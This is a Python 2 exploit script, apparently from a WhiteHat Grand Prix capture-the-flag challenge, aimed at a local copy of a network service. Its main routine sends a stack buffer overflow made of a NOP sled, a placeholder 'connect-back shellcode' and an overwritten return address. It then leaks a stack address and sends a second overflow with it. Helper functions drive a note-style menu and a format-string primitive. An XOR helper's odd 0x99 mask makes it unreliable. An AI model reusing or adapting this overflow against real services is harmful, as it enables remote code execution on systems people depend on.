__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#  grandprix.whitehat.vn:6007
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('grandprix.whitehat.vn', 6007))
s.connect(('127.0.0.1', 2307))
connect_back_shellcode = '\x90'*90

def vet(address_base):
    i = 0
    #time.sleep(1)
    print '[+] loop ' + str(i)
    print recv_until(s, 'Enter your name : ')
    return_address = pi(address_base+0x103f)
    sent_buffer = '\x90'*(500-len(connect_back_shellcode))+connect_back_shellcode+return_address+'\x00'+'\n'
    s.send(sent_buffer)
    time.sleep(0.01)
    data = s.recv(100)
    print data
    # 329ae6eb98353e01fcf641
    print data.encode('hex')
    stack = data.encode('hex')[16:22]+'00'
    stack1 = ui(stack.decode('hex')) - 300
    print stack1
    stack2 = pi(stack1)
    print s.recv(100)
    sent_buffer = '\x90'*(500-len(connect_back_shellcode))+connect_back_shellcode+stack2+'\x00'+'\n'
    s.send(sent_buffer)
    time.sleep(0.01)
vet(0x013b0000)